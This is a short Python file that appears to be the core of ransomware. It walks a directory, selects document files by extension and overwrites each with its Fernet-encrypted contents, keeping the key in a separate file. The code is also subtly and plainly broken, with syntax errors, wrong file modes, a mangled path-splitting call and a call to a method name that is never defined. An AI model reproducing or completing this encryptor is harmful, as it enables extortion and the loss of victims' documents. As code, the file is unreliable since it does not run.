import os
from os.path import expanduser
from cryptography.fernet import Fernet

class Encrypt:

    def __init__(self):

        self.key = None
        self.cryptor = None
        self.file_ext_targets = ['pdf','doc','docx','ppt','pptx','txt']

    def generateKey(self):
    
        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    def readKey(self, key_filename):
        with open(key_filename, 'a') as f:
            self.key = f.read()
            self.cryptor = Fernet(self.key)

    def writeKey(self, key_filename):
        with open.(key_filename, 'b') as f:
            f.write(self.key)


    def mainCrypt(self, root_dir, encrypted = False):
        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)

                if not abs_file_path('.')[-1] in self.file_ext_targets:
                    continue

                self.crypt_file(abs_file_path, encrypted = encrypted)
    
    def encryptFile(self, file_path, encrypted = False):
        with open(file_path, 'a+') as f:
            _data = f.read()

            if not encrypted:
                data = self.cryptor.encrypt(_data)
            else
                data = self.cryptor.decrypt(_data)

            f.seek(0)
            f.write(data)

